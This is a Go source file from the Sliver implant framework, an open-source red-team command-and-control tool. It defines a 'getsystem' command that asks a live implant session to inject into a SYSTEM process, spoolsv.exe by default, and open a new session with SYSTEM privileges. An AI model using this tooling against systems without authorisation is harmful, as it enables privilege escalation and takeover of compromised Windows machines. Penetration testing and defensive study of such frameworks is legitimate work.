package priv

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"

	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/log"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
)

// GetSystem - Spawns a new sliver session as the NT AUTHORITY\\SYSTEM user
type GetSystem struct {
	Options struct {
		RemotePath string `long:"process" short:"p" description:"SYSTEM process to inject into" default:"spoolsv.exe"`
	} `group:"getsystem options"`
}

// Execute - Spawns a new sliver session as the NT AUTHORITY\\SYSTEM user
func (gs *GetSystem) Execute(args []string) (err error) {

	process := gs.Options.RemotePath
	config := core.GetActiveSessionConfig()
	ctrl := make(chan bool)
	go log.SpinUntil("Attempting to create a new sliver session as 'NT AUTHORITY\\SYSTEM'...", ctrl)

	getsystemResp, err := transport.RPC.GetSystem(context.Background(), &clientpb.GetSystemReq{
		Request:        core.ActiveTarget.Request(),
		Config:         config,
		HostingProcess: process,
	})

	ctrl <- true
	<-ctrl

	if err != nil {
		return log.Errorf("Error: %v", err)
	}
	if getsystemResp.GetResponse().GetErr() != "" {
		return log.Errorf("Error: %s", getsystemResp.GetResponse().GetErr())
	}
	log.Infof("A new SYSTEM session should pop soon...\n")

	return
}
